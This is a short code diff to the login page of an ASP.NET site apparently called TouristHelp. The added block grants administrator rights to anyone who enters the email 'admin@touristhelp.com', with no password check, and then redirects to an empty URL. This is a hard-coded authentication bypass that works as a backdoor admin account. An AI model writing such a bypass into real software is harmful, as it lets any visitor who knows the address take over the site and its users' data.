@@ -18,6 +18,13 @@ namespace TouristHelp
         {
             if (Page.IsValid)
             {
+                if(tbEmail.Text == "admin@touristhelp.com")
+                {
+                    Session["admin"] = true;
+                    Response.Redirect("");
+                    return;
+                }
+
                 try
                 {
                     TourGuide user = TourGuideDAO.SelectTourGuideByEmail(tbEmail.Text);
